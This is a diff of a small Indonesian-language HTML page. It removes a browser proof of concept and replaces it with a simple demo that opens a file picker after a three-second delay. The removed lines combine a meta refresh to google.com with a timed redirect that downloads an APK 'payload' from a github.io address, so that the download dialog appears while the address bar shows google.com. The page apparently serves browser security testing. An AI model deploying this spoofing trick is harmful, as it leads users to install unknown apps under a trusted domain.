@@ -1,21 +1,47 @@
-<html>
+<!DOCTYPE html>
+<html lang="id">
 <head>
-    <title>PoC Meta Race Condition</title>
-    <!-- Refresh pertama: arahkan tab ini ke Google (target spoof) -->
-    <meta http-equiv="refresh" content="3; url=https://google.com">
+    <meta charset="UTF-8">
+    <title>Simulasi Unggah Berkas Tertunda</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        .status { margin-top: 10px; font-weight: bold; color: blue; }
+    </style>
 </head>
 <body>
-    <h1>Testing Meta Race Condition</h1>
-    <p>Dalam 5 detik, halaman ini akan navigasi ke Google.</p>
+
+    <h1>Simulasi File Upload dengan Delay</h1>
     
+    <button id="btnUpload" onclick="prosesUnggahTertunda()">1 Klik untuk Upload</button>
+    
+    <input type="file" id="fileInput" style="display: none;" onchange="berkasDipilih(event)">
+
+    <div id="statusMulai" class="status"></div>
+
     <script>
-        // Trigger download tepat saat navigasi ke Google dimulai
-        setTimeout(function(){
-            console.log("Triggering download payload...");
-            window.location.href = 'https://bangbedul19-del.github.io/bedulsantuy/pocbedul.apk';
-        }, 5000); // 100ms sebelum meta-refresh eksekusi
+        function prosesUnggahTertunda() {
+            const statusDiv = document.getElementById('statusMulai');
+            statusDiv.innerText = "Tombol diklik. Menunggu 3 detik sebelum membuka pemilih berkas...";
+            statusDiv.style.color = "blue";
+
+            // Mengatur delay menggunakan setTimeout (misal: 3000 milidetik / 3 detik)
+            setTimeout(function() {
+                statusDiv.innerText = "Membuka kotak dialog berkas...";
+                statusDiv.style.color = "green";
+                
+                // Memicu klik pada input file tersembunyi
+                document.getElementById('fileInput').click();
+            }, 3000); 
+        }
+
+        function berkasDipilih(event) {
+            const file = event.target.files[0];
+            if (file) {
+                alert("Berkas siap diproses: " + file.name);
+                // Di sini Anda dapat menambahkan logika penanganan berkas (e.g., Fetch/Axios ke server)
+            }
+        }
     </script>
 
-    <p>Jika berhasil, Address Bar akan menunjukkan google.com sementara dialog download muncul.</p>
 </body>
 </html>
